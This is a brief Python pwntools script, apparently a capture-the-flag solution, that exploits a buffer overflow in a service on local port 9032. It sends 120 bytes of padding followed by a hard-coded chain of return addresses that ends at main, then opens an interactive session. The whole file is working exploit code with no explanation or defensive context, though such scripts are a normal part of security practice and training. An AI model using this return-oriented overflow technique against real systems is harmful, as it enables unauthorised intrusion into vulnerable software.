import pwn
from pwn.toplevel import p32

pwn.context.arch = 'i386'

A = pwn.p32(0x0804129d, 'little')
B = pwn.p32(0x080412cf, 'little')
C = pwn.p32(0x08041301, 'little')
D = pwn.p32(0x08041333, 'little')
E = pwn.p32(0x08041365, 'little')
F = pwn.p32(0x08041397, 'little')
G = pwn.p32(0x080413c9, 'little')
main = pwn.p32(0x080414fc) #"\xfc\x14\x04\x08" 

gadgets = A+B+C+D+E+F+G+main

p = pwn.remote(0, 9032)
p.sendline('77'.encode())
p.send(('A'*120).encode())
p.sendline(gadgets)

print(p.recv())
p.interactive()
              
